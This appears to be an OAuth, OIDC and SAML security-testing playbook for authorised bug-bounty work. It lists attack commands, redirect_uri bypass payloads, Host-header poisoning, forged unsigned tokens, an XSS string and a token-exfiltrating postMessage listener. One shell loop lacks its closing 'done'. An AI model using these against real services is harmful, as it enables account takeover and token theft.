## OA-A — Redirect URI & Front-Channel Leakage

### OA-03 · Test redirect_uri validation bypass (path traversal, subdomain, parser tricks) — `CRITICAL`
Tags: `oauth` `redirect_uri` `code-theft` · Subagent: OA-A

If the authorization server sends the code/token to a URL the attacker controls (or to an attacker-reachable page on the client), B's code/token is stolen → ATO.

```bash
python3 -I $S/redirect_uri_variants.py --registered "$CB" --attacker "$COLLAB" \
  --authorize "$AUTHZ" --param client_id=$CID --param response_type=code --param scope=openid \
  > artifacts/oauth/redirect_candidates.tsv
$S/probe_authorize.sh --target example.com --urls artifacts/oauth/redirect_candidates.tsv --delay 1
# Then confirm promising rows in B's browser (logged in at the IdP): does the code land on $COLLAB?
```

Variant families (all generated by the script): exact-match drift (trailing slash, case, port, `http`), path traversal (`/callback/../x`, `%2e%2e%2f`, `..;/`), prefix/suffix matching (`$CB.evil`, `evil/$CB`), subdomain (`evil.app.com`, `app.com.evil`), userinfo/authority confusion (`app.com@evil`, `evil#@app.com`, `app.com%20%26@evil#@app.com`), parameter pollution (two `redirect_uri`), `localhost`/`127.0.0.1` allowances, scheme tricks (`javascript:`, custom mobile schemes), IDN/Unicode normalisation, query/fragment appends.

- **Fail:** code or token delivered to a host/path you control, or to a client page that leaks it (OA-04/05).
- **Pass:** exact string match on pre-registered URIs (BCP §4.1.3).
- **Refs:** `PS/` (Leaking authorization codes and access tokens; Flawed redirect_uri validation) · `WSTG-ATHZ-05` · `BCP` §4.1 · https://portswigger.net/research/hidden-oauth-attack-vectors

### OA-04 · Check for open redirect via redirect_uri (and error-path redirects) — `HIGH`
Tags: `oauth` `open-redirect` `chaining` · Subagent: OA-A

Two forms: (1) the AS redirects to an unregistered `redirect_uri` on **error** (`scope=INVALID`, bad `response_type`) — RFC 6749 §4.1.2.1 says it must not; (2) the registered domain has an open redirect / proxy page you can chain (`$APP/callback/../redirect?to=$COLLAB`).

```bash
curl -sk -o /dev/null -D - "$AUTHZ?client_id=$CID&response_type=code&scope=INVALID_SCOPE&redirect_uri=https://$COLLAB/" \
  | grep -i '^location'
# Chain: find open redirects with linkparamdiscovery / wordlists/OR-Payloads.txt, then:
#   redirect_uri=$APP/oauth-callback/../post/next?path=https://$COLLAB/exploit   (PortSwigger lab pattern)
```

For implicit/fragment flows the fragment survives the redirect; host a page that reads `location.hash` and beacons it to your server (see PortSwigger lab *Stealing OAuth access tokens via an open redirect*).

- **Fail:** AS redirects to an arbitrary host, or a chained gadget delivers the code/token off-site.
- **Refs:** `PS/` · https://www.rfc-editor.org/rfc/rfc6749#section-4.1.2.1 · HackerOne #905607 (open redirect + OAuth ATO)

### OA-05 · Test OAuth code/token leakage in Referer after redirect — `HIGH`
Tags: `oauth` `referer` `leakage` · Subagent: OA-A

The callback page (`$CB?code=…`) may load third-party resources or contain attacker-influenced HTML (`<img src=//$COLLAB>` via HTML injection, user avatars, ads) before the code is consumed or the URL cleaned.

```bash
curl -sk "$CB?code=bbtest&state=x" -D $E/OA-05_hdr.txt -o $E/OA-05_cb.html
grep -i referrer-policy $E/OA-05_hdr.txt
grep -Eo '(src|href)="https?://[^"]+' $E/OA-05_cb.html | sort -u
python3 -I $S/oauth_har_audit.py artifacts/oauth/login_B.har | grep -i referer
```

- **Fail:** a live code/token reaches a third party via Referer (or via analytics URL capture) and is still usable (code not yet redeemed, or token).
- **Pass:** `Referrer-Policy: no-referrer`/`strict-origin`, no third-party loads on the callback, URL replaced before render, single-use codes.
- **Refs:** `BCP` §4.2 (Credential leakage via Referer) · `PS/`

### OA-06 · Check implicit grant token exposure in URL fragment — `MEDIUM`
Tags: `oauth` `implicit` `fragment` · Subagent: OA-A

Check whether the AS still accepts `response_type=token` / `id_token token` for this client (BCP: implicit SHOULD NOT be used). Where it is used, check what reads `location.hash`, whether the token is posted to the backend (OA-32), stored in localStorage, or leaked via redirects/postMessage.

```bash
curl -sk -o /dev/null -D - "$AUTHZ?client_id=$CID&response_type=token&redirect_uri=$CB&scope=openid&nonce=1" | grep -i location
```

- **Fail:** access token in fragment is exfiltrable (via OA-03/04/37 chain) or persisted in history/logs; scope broader than needed.
- **INFO:** implicit enabled but no leak path.
- **Refs:** `BCP` §2.1.2 · `PS/` (Implicit grant type) · `CS-OAUTH`

### OA-30 · Test redirect_uri mismatch between authorization and token endpoints — `HIGH`
Tags: `oauth` `redirect_uri` `token-endpoint` · Subagent: OA-A

RFC 6749 §4.1.3: if `redirect_uri` was in the authorization request, the token request must include the **identical** value. If the AS skips this, a code stolen via a loose `redirect_uri` can be redeemed by the legit client.

```bash
# Obtain code for A with redirect_uri=$CB/extra (if accepted), redeem with the registered value (needs client creds, or via client's own callback):
curl -sk -X POST "$TOKEN" -d "grant_type=authorization_code&code=$CODE_A&redirect_uri=$CB&client_id=$CID" -w '\n%{http_code}\n'
# Also: omit redirect_uri entirely; send a different one.
```

- **Fail:** token issued despite mismatch/omission.
- **Refs:** https://www.rfc-editor.org/rfc/rfc6749#section-4.1.3 · `BCP` §4.1

### OA-35 · Test Host-header / X-Forwarded-Host poisoning of redirect_uri — `HIGH`
Tags: `oauth` `host-header` `redirect_uri` · Subagent: OA-A

Some clients build `redirect_uri` from the incoming Host header when starting the flow (`GET /login/twitter`). Poisoning it sends B's code to your host (Periscope TV write-up).

```bash
for h in "Host: $COLLAB" "X-Forwarded-Host: $COLLAB" "X-Host: $COLLAB" "X-Forwarded-Server: $COLLAB"; do
  curl -sk -o /dev/null -D - -H "$h" "$APP/login/oauth?provider=google" | grep -i '^location' | sed "s|^|$h -> |"
done
```

- **Fail:** generated authorization URL contains your host in `redirect_uri` (and the AS accepts it, or a cache stores it).
- **Refs:** https://portswigger.net/web-security/host-header · `PS/`

### OA-36 · Test response_type / response_mode manipulation — `MEDIUM`
Tags: `oauth` `response_mode` `hybrid` · Subagent: OA-A

Switch `response_mode` (`query` ↔ `fragment` ↔ `form_post` ↔ `web_message`) and `response_type` (`code` → `code id_token`, `code token`, `token`) to move secrets into the query string (Referer/logs), into an unvalidated postMessage, or to obtain tokens the client never asked for.

```bash
for rm in query fragment form_post web_message; do
  echo "$AUTHZ?client_id=$CID&redirect_uri=$CB&response_type=code+token&response_mode=$rm&scope=openid&nonce=1&state=x"
done   # open each in A's browser; inspect where the token lands
```

- **Fail:** tokens delivered in query string or via a channel the client doesn't protect; AS issues token types not registered for the client.
- **Refs:** https://openid.net/specs/oauth-v2-multiple-response-types-1_0.html · `BCP` §2.1.2 · https://portswigger.net/research/hidden-oauth-attack-vectors

### OA-37 · Test postMessage token relays (popup login / web_message) — `HIGH`
Tags: `oauth` `postmessage` `popup` · Subagent: OA-A

Popup-based logins often relay the code/token from the callback window to `window.opener` with `postMessage(data, "*")`, or the opener accepts messages from any origin.

```js
// In devtools on the callback page source (or via jsrecon output), search:
//   postMessage(  ...  "*")      addEventListener("message"  without origin check
// PoC (own accounts): attacker page opens $AUTHZ (redirect_uri=$CB) in a popup and listens:
window.addEventListener('message', e => fetch('https://COLLAB/?d='+encodeURIComponent(JSON.stringify(e.data))));
```

- **Fail:** code/token delivered to an attacker window, or opener accepts a forged identity message.
- **Refs:** https://portswigger.net/web-security/dom-based/controlling-the-web-message-source · https://portswigger.net/research/hidden-oauth-attack-vectors

## OA-B — State, CSRF & Account Linking

### OA-01 · Test authorization code flow for CSRF (missing state) — `HIGH`
Tags: `oauth` `csrf` `state` · Subagent: OA-B

Login CSRF / **account-linking CSRF**: A starts a flow (often "Connect social profile"), captures the callback URL with A's code, **drops** it, and makes B load it. B's account gets linked to A's IdP identity; A then logs in as B.

```html
<!-- Hosted on your own server; opened in B's logged-in browser -->
<iframe src="https://APP/oauth-linking?code=CODE_FOR_A_IDP"></iframe>
```

```bash
python3 -I $S/oauth_har_audit.py artifacts/oauth/link_A.har | grep -iE 'state|OA-01'
```

- **Fail:** B's account now accepts login via A's IdP identity (or B is logged into A's account — login CSRF, lower severity).
- **Refs:** `PS/` (Flawed CSRF protection lab) · https://www.rfc-editor.org/rfc/rfc6749#section-10.12 · `WSTG-ATHZ-05`

### OA-02 · Check state is present, unpredictable, session-bound and validated — `HIGH`
Tags: `oauth` `state` · Subagent: OA-B

Variants: state absent; static/predictable; present but not validated on return (remove it / change it / swap A's and B's); not bound to the browser session (A's state accepted in B's session); reusable.

```bash
# Callback replay variants (A's session):
curl -sk -b "$SESS_A" "$CB?code=$CODE_A" -o /dev/null -w 'no-state %{http_code}\n'
curl -sk -b "$SESS_A" "$CB?code=$CODE_A&state=bbtest" -o /dev/null -w 'bad-state %{http_code}\n'
curl -sk -b "$SESS_B" "$CB?code=$CODE_A&state=$STATE_A" -o /dev/null -w 'cross-session %{http_code}\n'
```

- **Fail:** any variant completes the flow. With PKCE, the AS still must not rely on state alone — note whether PKCE mitigates (BCP §4.7.1 allows PKCE *or* nonce as CSRF protection for some clients).
- **Refs:** `PS/` · `BCP` §4.7 · `CS-OAUTH`

### OA-21 · Check IdP-initiated SSO / unsolicited response attacks — `MEDIUM`
Tags: `sso` `idp-initiated` `saml` `login-csrf` · Subagent: OA-B

IdP-initiated SAML (no `InResponseTo`) and unsolicited OIDC responses can't be tied to an SP request → login CSRF, replay windows, and injection of A's assertion into B's browser.

```bash
python3 -I $S/saml_inspect.py artifacts/oauth/saml_response.b64 | grep -i inresponseto
# Post A's captured unsolicited SAMLResponse to the ACS from B's browser (auto-submitting form you host)
```

- **Fail:** SP accepts unsolicited responses on sensitive flows without additional binding; B ends up authenticated as A (login CSRF) or A's assertion is replayable.
- **Refs:** `CS-SAML` (Unsolicited Response / IdP-initiated SSO) · `OIDC` §3.1.2.7 (state/nonce)

### OA-31 · Unverified-email account linking / pre-account takeover — `CRITICAL`
Tags: `oauth` `account-takeover` `email-verification` · Subagent: OA-B

Both directions:
1. **Classic pre-ATO:** register on the target with B's email + password (no verification). B later signs in with Google using that email → app merges into the attacker-created account.
2. **IdP side:** create an IdP account (an IdP that does not verify email, or the target's own OAuth provider) claiming B's email. Sign into the target → app trusts `email` without `email_verified=true` and logs you in as B.

```bash
python3 -I $SM/jwt_inspect.py "$ID_TOKEN_FROM_UNVERIFIED_IDP" | grep -iE 'email|verified'
```

- **Fail:** attacker gains access to B's account, or retains access after B signs up via SSO.
- **Pass:** linking requires verified email at both sides **plus** re-authentication; app keys accounts by (`iss`,`sub`), not email.
- **Refs:** `PS/` (Authentication bypass via OAuth implicit flow; unverified email) · HackerOne #192648, #671406, #922456 · Descope *nOAuth* research, 2023 (Azure AD apps trusting the mutable `email` claim)

### OA-32 · Implicit-flow client trusts user-supplied identity — `CRITICAL`
Tags: `oauth` `implicit` `auth-bypass` · Subagent: OA-B

After implicit login, SPAs often `POST /authenticate {"email","username","token"}` to create a session. If the server doesn't check that `token` belongs to `email`, swap in B's email.

```bash
curl -sk -X POST "$APP/authenticate" -H 'Content-Type: application/json' \
  -d "{\"email\":\"B@example.test\",\"username\":\"B\",\"token\":\"$ACCESS_TOKEN_A\"}" -D - -o $E/OA-32.json
```

- **Fail:** session issued for B with A's token.
- **Refs:** `PS/` (lab: Authentication bypass via OAuth implicit flow)

### OA-34 · Test redirect_uri / client_id session poisoning in consent — `HIGH`
Tags: `oauth` `consent` `session-poisoning` · Subagent: OA-B

If the consent POST (`POST /auth {"scope":…,"authorize":"Authorize"}`) takes the client from the **session** rather than the request, a parallel cross-site request with an untrusted `client_id` (your DCR client, OA-33) can swap the client B approves.

```text
1. B's browser: open $AUTHZ?client_id=TRUSTED... (consent screen for trusted app)
2. Hidden cross-site request in same browser: $AUTHZ?client_id=ATTACKER_CLIENT&redirect_uri=https://COLLAB/...
3. B clicks "Authorize" on screen 1 → is the code issued to ATTACKER_CLIENT / COLLAB?
Add prompt=consent to force the screen when B previously approved.
```

- **Fail:** code/token issued to the attacker client.
- **Refs:** https://portswigger.net/research/hidden-oauth-attack-vectors · `OIDC` §3.1.2.1 (`prompt`)

### OA-38 · Test silent authentication (prompt=none) and consent bypass — `MEDIUM`
Tags: `oauth` `prompt-none` `consent` `csrf` · Subagent: OA-B

- `prompt=none` with a new scope/client should return `consent_required`, not a code.
- Consent endpoint must be CSRF-protected (doorkeeper CVE pattern: attacker silently installs an app for B).
- Previously granted consent must not extend to newly requested scopes.

```bash
open "$AUTHZ?client_id=$CID&redirect_uri=$CB&response_type=code&scope=openid+email+admin&prompt=none&state=x"   # in B's browser
```

- **Fail:** code issued silently for scopes B never approved; consent POST accepted cross-site without CSRF token.
- **Refs:** `OIDC` §3.1.2.1 · doorkeeper consent-CSRF disclosure (silent app install on DigitalOcean) · `CS-OAUTH`

## OA-C — Code, Token & Client Security

### OA-07 · Test OAuth scope escalation — `HIGH`
Tags: `oauth` `scope` `privilege-escalation` · Subagent: OA-C

Three places: authorization request (add `admin write:all repo offline_access`), **token request** (add `scope=` to the code exchange — AS should reject scopes beyond the authorized set), and refresh (`grant_type=refresh_token&scope=…` must not widen). Also check whether the resource server enforces scope at all.

```bash
curl -sk -X POST "$TOKEN" -d "grant_type=authorization_code&code=$CODE_A&redirect_uri=$CB&client_id=$CID&client_secret=$SECRET_IF_YOURS&scope=openid+email+profile+admin" -o $E/OA-07.json
python3 -I $SM/jwt_inspect.py "$(jq -r .access_token $E/OA-07.json)" | grep -i scope
```

- **Fail:** issued token has scopes not consented, or API honours a scope the token lacks.
- **Refs:** `PS/` (Flawed scope validation) · https://www.rfc-editor.org/rfc/rfc6749#section-3.3

### OA-08 · Check authorization code reuse — `HIGH`
Tags: `oauth` `code-reuse` · Subagent: OA-C

Redeem the same code twice (directly, or replay the callback URL in a second session). RFC 6749 §4.1.2: codes are single-use; on reuse the AS SHOULD revoke tokens already issued from it.

```bash
for i in 1 2; do curl -sk -X POST "$TOKEN" -d "grant_type=authorization_code&code=$CODE_A&redirect_uri=$CB&client_id=$CID&code_verifier=$VER" -w " -> %{http_code}\n" -o /dev/null; done
curl -sk -b "$FRESH_SESSION" "$CB?code=$CODE_A&state=$STATE_A" -D - -o /dev/null | grep -i set-cookie
```

- **Fail:** second redemption succeeds, or the first token survives reuse; long-lived codes (> 10 min).
- **Refs:** https://www.rfc-editor.org/rfc/rfc6749#section-4.1.2 · `BCP` §4.5

### OA-09 · Test PKCE implementation — `HIGH`
Tags: `oauth` `pkce` `native` · Subagent: OA-C

Check: PKCE required for public/native clients; `S256` enforced (`plain` rejected); verifier actually checked (wrong verifier → reject); challenge bound to the code (A's verifier with B's code → reject); verifier length/charset (43–128 chars).

```bash
VER=$(python3 -c "import secrets;print(secrets.token_urlsafe(64)[:64])")
CH=$(python3 -c "import hashlib,base64,sys;print(base64.urlsafe_b64encode(hashlib.sha256(sys.argv[1].encode()).digest()).decode().rstrip('='))" "$VER")
# authorize with &code_challenge=$CH&code_challenge_method=S256, then redeem with a WRONG verifier:
curl -sk -X POST "$TOKEN" -d "grant_type=authorization_code&code=$CODE_A&redirect_uri=$CB&client_id=$CID&code_verifier=wrongwrongwrongwrongwrongwrongwrongwrongwrong" -w '\n%{http_code}\n'
```

- **Fail:** wrong verifier accepted; `plain` accepted; native client without PKCE.
- **Refs:** https://www.rfc-editor.org/rfc/rfc7636 · `BCP` §2.1.1 · HackerOne #1025581

### OA-11 · Test token exchange and delegation attacks — `HIGH`
Tags: `oauth` `token-exchange` `rfc8693` · Subagent: OA-C

If `grant_type=urn:ietf:params:oauth:grant-type:token-exchange` is supported: exchange A's token for a token with a different `audience`/`resource`/`scope`, impersonate (`subject_token` of A, `requested_subject` / `actor_token` tricks), or exchange a token issued to another client.

```bash
curl -sk -X POST "$TOKEN" -u "$CID:$SECRET_IF_YOURS" \
  -d 'grant_type=urn:ietf:params:oauth:grant-type:token-exchange' \
  -d "subject_token=$AT_A&subject_token_type=urn:ietf:params:oauth:token-type:access_token" \
  -d 'audience=internal-admin-api&scope=admin' -o $E/OA-11.json -w '%{http_code}\n'
```

- **Fail:** exchange yields broader audience/scope than policy allows, or impersonation without delegation rights.
- **Refs:** https://www.rfc-editor.org/rfc/rfc8693 · `BCP` §4.10

### OA-26 · Test client credentials grant for impersonation — `HIGH`
Tags: `oauth` `client-credentials` `m2m` · Subagent: OA-C

With any recovered or self-registered client credentials: does `client_credentials` yield tokens accepted by user-facing APIs? Does the token carry a `sub` that collides with a user ID (client_id == user_id)? Can extra parameters (`sub`, `username`, `user_id`) choose the subject?

```bash
curl -sk -X POST "$TOKEN" -u "$CID:$SECRET" -d 'grant_type=client_credentials&scope=openid profile' -o $E/OA-26.json
python3 -I $SM/jwt_inspect.py "$(jq -r .access_token $E/OA-26.json)"

```

- **Fail:** machine token acts as a user, or subject is attacker-selectable.
- **Refs:** https://www.rfc-editor.org/rfc/rfc6749#section-4.4 · `BCP` §4.15 (client impersonating resource owner)

### OA-27 · Check refresh token rotation and reuse prevention — `HIGH`
Tags: `oauth` `refresh-token` · Subagent: OA-C

Same procedure as `session-management` SM-31, at the OAuth token endpoint: rotation on each use; reuse of an old refresh token revokes the family; refresh token bound to `client_id` (redeem A's with another client → reject); scope cannot widen; revoked on logout/password change/grant revocation.

```bash
curl -sk -X POST "$TOKEN" -d "grant_type=refresh_token&refresh_token=$RT1&client_id=$CID" -o $E/OA-27_r1.json
curl -sk -X POST "$TOKEN" -d "grant_type=refresh_token&refresh_token=$RT1&client_id=$CID" -w '\nreuse %{http_code}\n'
curl -sk -X POST "$TOKEN" -d "grant_type=refresh_token&refresh_token=$RT1&client_id=OTHER_CLIENT" -w '\ncross-client %{http_code}\n'
```

- **Refs:** `BCP` §4.14 · `CS-OAUTH`

### OA-33 · Dynamic Client Registration abuse — `HIGH`
Tags: `oauth` `dcr` `rfc7591` · Subagent: OA-C

Check `registration_endpoint` (from discovery, or `/register`, `/oauth/register`, `/connect/register`). Unauthenticated registration lets you mint a client with your `redirect_uris`; client metadata URLs (`logo_uri`, `jwks_uri`, `sector_identifier_uri`, `request_uris`) may be fetched server-side (→ OA-48 SSRF).

```bash
curl -sk -X POST "$REG" -H 'Content-Type: application/json' -o $E/OA-33.json -w '%{http_code}\n' -d '{
  "client_name":"bbtest-'$USER'","redirect_uris":["https://'$COLLAB'/cb"],
  "grant_types":["authorization_code"],"response_types":["code"],
  "logo_uri":"https://'$COLLAB'/logo.png"}'
```

- **Fail:** unauthenticated registration of an arbitrary redirect, privileged grant types accepted, or server-side fetch of metadata URLs. Delete the client afterwards (`registration_client_uri`).
- **Refs:** https://www.rfc-editor.org/rfc/rfc7591 · https://portswigger.net/research/hidden-oauth-attack-vectors · HackerOne #705937

### OA-39 · Test acr_values / amr_values MFA downgrade — `HIGH`
Tags: `oidc` `acr` `amr` `mfa-bypass` · Subagent: OA-C

If the client requests `acr_values=…mfa` / `amr_values=pwd+otp`, remove or lower it; then check whether the client/RP validates the returned `acr`/`amr` claims before granting MFA-protected access.

```bash
python3 -I $SM/jwt_inspect.py "$ID_TOKEN" | grep -iE '"(acr|amr)"'
# Re-run authorization with acr_values removed / amr_values=pwd ; does the app still treat the session as MFA-complete?
```

- **Fail:** MFA-only area reachable with a single-factor id_token.
- **Refs:** https://www.rfc-editor.org/rfc/rfc8176 · `OIDC` §2 (acr, amr) and §3.1.2.1 (acr_values)

### OA-40 · Device Authorization Grant & CIBA abuse — `MEDIUM`
Tags: `oauth` `device-flow` `ciba` · Subagent: OA-C

Device flow (`device_authorization_endpoint`): `user_code` entropy and brute-force limits; polling rate limits (`slow_down`); `verification_uri_complete` phishing feasibility (note only). CIBA (`backchannel_authentication_endpoint`): `login_hint` user enumeration, notification flooding, and whether the auth request is bound to the requesting client.

```bash
curl -sk -X POST "$DEVICE_EP" -d "client_id=$CID&scope=openid" -o $E/OA-40.json; jq . $E/OA-40.json
# CIBA: only with your own login_hint identities; never trigger pushes to others
```

- **Fail:** short/guessable user codes without limits; enumeration via `login_hint` responses; unbound CIBA auth.
- **Refs:** https://www.rfc-editor.org/rfc/rfc8628 · https://openid.net/specs/openid-client-initiated-backchannel-authentication-core-1_0.html

### OA-41 · Access-token audience / resource confusion — `HIGH`
Tags: `oauth` `audience` `token-confusion` · Subagent: OA-C

A token issued to client X (or for API X) must not be accepted by client Y / API Y. Obtain a token through a different client on the same AS (another first-party app, your DCR client) and present it to the target API.

```bash
python3 -I $SM/jwt_inspect.py "$AT_FROM_OTHER_CLIENT" | grep -iE '"(aud|azp|client_id|scope)"'
curl -sk -H "Authorization: Bearer $AT_FROM_OTHER_CLIENT" "$APP/api/me" -w '\n%{http_code}\n'
```

- **Fail:** cross-client/cross-API token accepted.
- **Refs:** `BCP` §4.10 (resource/audience restriction) · https://www.rfc-editor.org/rfc/rfc8707

### OA-42 · CORS on token, userinfo and API endpoints — `MEDIUM`
Tags: `oauth` `cors` · Subagent: OA-C

```bash
for ep in "$TOKEN" "$USERINFO" "$APP/api/me"; do
  curl -sk -o /dev/null -D - -H "Origin: https://$COLLAB" -X OPTIONS "$ep" \
    -H 'Access-Control-Request-Method: POST' | grep -i '^access-control' | sed "s|^|$ep: |"
```

- **Refs:** https://portswigger.net/web-security/cors · `api-security` skill

### OA-43 · Error handling and information disclosure — `LOW`
Tags: `oauth` `error-handling` · Subagent: OA-C

Malformed `client_id`, `redirect_uri`, `grant_type`, `code`, oversized params, wrong content types. Look for stack traces, internal hostnames, echoed secrets, client enumeration (`invalid_client` vs `unauthorized_client`), and error redirects to unvalidated URIs (OA-04).

- **Fail:** sensitive data in errors; reflected error_description → XSS on the callback (`$CB?error=x&error_description=<svg/onload=…>`).
- **Refs:** https://www.rfc-editor.org/rfc/rfc6749#section-5.2 · `WSTG-ATHZ-05`

### OA-44 · Token revocation endpoint (RFC 7009) — `MEDIUM`
Tags: `oauth` `revocation` `logout` · Subagent: OA-C

```bash
curl -sk -X POST "$REVOKE" -d "token=$RT_A&token_type_hint=refresh_token&client_id=$CID" -w '%{http_code}\n'
curl -sk -X POST "$TOKEN" -d "grant_type=refresh_token&refresh_token=$RT_A&client_id=$CID" -w '\nafter-revoke %{http_code}\n'
# Can client X revoke a token of client Y (DoS)? Does revoking the refresh token revoke derived access tokens?
# Does "Remove app access" in the user's account settings revoke all tokens?
```

- **Fail:** revoked tokens still work; cross-client revocation; user-facing "revoke access" ineffective.
- **Refs:** https://www.rfc-editor.org/rfc/rfc7009 · `CS-OAUTH`

### OA-48 · SSRF via OAuth/OIDC/SAML metadata URLs — `HIGH`
Tags: `oauth` `ssrf` `jwks_uri` `request_uri` · Subagent: OA-C

Server-side fetches of attacker-supplied URLs: `request_uri` (authorization request), DCR `jwks_uri` / `logo_uri` / `sector_identifier_uri`, JWT `jku`/`x5u` (id_token / client assertions), SAML metadata URLs in admin SSO configuration.

```bash
open "$AUTHZ?client_id=$CID&request_uri=https://$COLLAB/req.jwt&response_type=code&redirect_uri=$CB"
```

- **Fail:** Collaborator receives a server-side request (record source IP). Hand off to `ssrf-audit` for internal reach and IMDS.
- **Refs:** https://portswigger.net/research/hidden-oauth-attack-vectors · https://www.rfc-editor.org/rfc/rfc9101

### OA-49 · Request object (JAR) / PAR manipulation — `MEDIUM`
Tags: `oidc` `jar` `request-object` `par` · Subagent: OA-C

If `request=` / `request_uri=` / `/par` are supported: unsigned request objects (`alg:none`), parameters outside the request object overriding signed ones, `request_uri` reuse across clients.

```bash
python3 -c "import base64,json;e=lambda o:base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip('=');print(e({'alg':'none'})+'.'+e({'client_id':'$CID','redirect_uri':'https://$COLLAB/cb','response_type':'code','scope':'openid'})+'.')"
```

- **Fail:** unsigned/attacker-altered request object honoured.
- **Refs:** https://www.rfc-editor.org/rfc/rfc9101 · https://www.rfc-editor.org/rfc/rfc9126

### OA-50 · Resource Owner Password Credentials (ROPC) grant enabled — `MEDIUM`
Tags: `oauth` `ropc` `password-grant` `mfa-bypass` · Subagent: OA-C

`grant_type=password` often bypasses MFA, CAPTCHA, lockout, and SSO-only policies enforced in the browser login.

## OA-D — OpenID Connect & SSO Session

### OA-16 · Test OIDC id_token signature validation — `CRITICAL`
Tags: `oidc` `id_token` `jwt` · Subagent: OA-D

Apply the JWT primitives from `session-management` SM-21…SM-29 to the id_token the **client** consumes (hybrid/implicit flows or `id_token` POSTed to the backend): `alg:none`, stripped signature, RS256→HS256 with the IdP's JWKS, `kid`/`jku` injection, and an id_token signed by a **different issuer's** key.

```bash
python3 -I $SM/jwt_inspect.py "$ID_TOKEN_A"
python3 jwt_tool.py "$ID_TOKEN_A" -X a        # none variants
curl -sk "$ISSUER/.well-known/jwks.json" -o artifacts/oauth/jwks.json
```

- **Fail:** forged id_token (with **your own** `sub`, or B's if authorised) accepted.
- **Refs:** `OIDC` §3.1.3.7 (ID Token Validation) · https://portswigger.net/web-security/jwt · https://portswigger.net/web-security/oauth/openid

### OA-17 · Check OIDC nonce validation — `MEDIUM`
Tags: `oidc` `nonce` `replay` · Subagent: OA-D

Required for implicit/hybrid flows. Remove `nonce` from the request; replay an id_token from a previous flow into a new one; swap A's id_token into B's flow.

- **Fail:** missing nonce accepted for implicit/hybrid; id_token replayable across sessions.
- **Refs:** `OIDC` §3.1.2.1, §15.5.2 · `BCP` §4.7

### OA-18 · Test OIDC token substitution between users / clients — `CRITICAL`
Tags: `oidc` `token-substitution` `aud` `iss` · Subagent: OA-D

- Replay an id_token issued to **another client_id** on the same IdP (missing `aud`/`azp` check).
- Self-hosted IdP / multi-tenant IdP (Azure AD, Auth0, Okta orgs): token from **your own tenant/issuer** with B's `email`/`sub` (missing `iss` / tenant check; *nOAuth*).
- Mix-up attack: two IdPs configured on the client; does the client verify the response came from the IdP it sent the user to (`iss` response parameter, RFC 9207)?
- Swap `code` from A's flow into B's callback (code injection) — mitigated only by PKCE/nonce.

- **Fail:** any substitution yields a session.
- **Refs:** `OIDC` §3.1.3.7 · https://www.rfc-editor.org/rfc/rfc9207 · `BCP` §4.4 (mix-up), §4.5 (code injection)

### OA-19 · Check SSO session persistence across applications — `MEDIUM`
Tags: `sso` `session` `federation` · Subagent: OA-D

Map every relying party sharing the IdP session. Test: logging out of app X leaves IdP session alive → app Y silently re-authenticates (expected vs documented behaviour); IdP session lifetime vs app policies; `max_age` / `prompt=login` honoured for sensitive apps; step-up auth not inherited incorrectly.

- **Fail:** a sensitive RP accepts a stale IdP session despite requesting `max_age`/`prompt=login`, or `auth_time` not checked.
- **Refs:** `OIDC` §3.1.2.1 (`max_age`, `prompt`), §2 (`auth_time`) · `CS-SAML` (session management)

### OA-20 · Test SSO logout across federated applications — `MEDIUM`
Tags: `sso` `logout` `slo` · Subagent: OA-D

Logout from one RP / the IdP: are other RP sessions terminated (OIDC front-channel/back-channel logout, SAML SLO)? Is `end_session_endpoint` `post_logout_redirect_uri` validated (open redirect)? Is `id_token_hint` required? CSRF logout is usually Info.

```bash
curl -sk -o /dev/null -D - "$END_SESSION?post_logout_redirect_uri=https://$COLLAB/&id_token_hint=$ID_TOKEN_A" | grep -i location
```

- **Fail:** sessions survive global logout where SLO is advertised; unvalidated `post_logout_redirect_uri`.
- **Refs:** https://openid.net/specs/openid-connect-rpinitiated-1_0.html · https://openid.net/specs/openid-connect-backchannel-1_0.html · `CS-SAML`

## OA-E — SAML

Capture `SAMLResponse` (POST to ACS) with Burp; install **SAML Raider**. Decode: `python3 -I $S/saml_inspect.py response.b64 | tee artifacts/oauth/saml_analysis.md`. Use only your own IdP users (A, B). Forged assertions assert **your own** NameID unless cross-user proof is authorised.

### OA-12 · Check SAML assertion XML injection — `HIGH`
Tags: `saml` `xml-injection` · Subagent: OA-E

Where user-controlled attributes (display name, email, department) are embedded in the assertion at the IdP, inject XML (`</saml:AttributeValue><saml:AttributeValue>admin`, closing/opening `NameID`) — if the IdP builds XML by string concatenation, injected nodes may be signed.

- **Fail:** injected element appears as a structural node in the signed assertion and the SP honours it.
- **Refs:** `CS-SAML` · https://owasp.org/www-community/vulnerabilities/XML_Injection

### OA-13 · Test SAML XML Signature Wrapping (XSW) — `CRITICAL`
Tags: `saml` `xsw` `signature` · Subagent: OA-E

SAML Raider → XSW1–XSW8: move the signed assertion, insert an evil assertion (NameID = your other account first, then B if authorised) that the SP's business logic reads while the signature check validates the original.

- **Fail:** any XSW variant authenticates as the injected NameID.
- **Refs:** *On Breaking SAML: Be Whoever You Want to Be* (USENIX Security 2012) · https://github.com/CompassSecurity/SAMLRaider · `CS-SAML`

### OA-14 · Test SAML assertion replay — `HIGH`
Tags: `saml` `replay` · Subagent: OA-E

Re-POST a consumed `SAMLResponse`: immediately, after logout, after `NotOnOrAfter`, to a different SP (see OA-46). The SP must cache assertion IDs until expiry and enforce `InResponseTo` for SP-initiated flows.

```bash
curl -sk -X POST "$ACS" --data-urlencode "SAMLResponse@artifacts/oauth/saml_response.b64" -D - -o /dev/null | grep -iE 'set-cookie|location'
```

- **Fail:** replay yields a new session.
- **Refs:** `CS-SAML` (Replay) · SAML 2.0 Profiles §4.1.4.5

### OA-15 · Check SAML XSLT injection in transforms — `HIGH`
Tags: `saml` `xslt` `rce` `ssrf` · Subagent: OA-E

Some XML-DSig libraries evaluate `<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">` **before** verifying the signature. Insert an XSLT transform that fetches `https://$COLLAB/xslt` (`document()` / `unparsed-text()`). Out-of-band callback only; no file reads or command execution.

- **Fail:** Collaborator receives a request from the SP → pre-auth XSLT processing (report; do not escalate further without permission).
- **Refs:** `CS-SAML` · https://www.w3.org/TR/xmldsig-core1/#sec-Transforms · `saml_inspect.py` flags XSLT transforms present in captured responses

### OA-22 · Test SAML comment injection in NameID — `CRITICAL`
Tags: `saml` `comment-injection` `nameid` · Subagent: OA-E

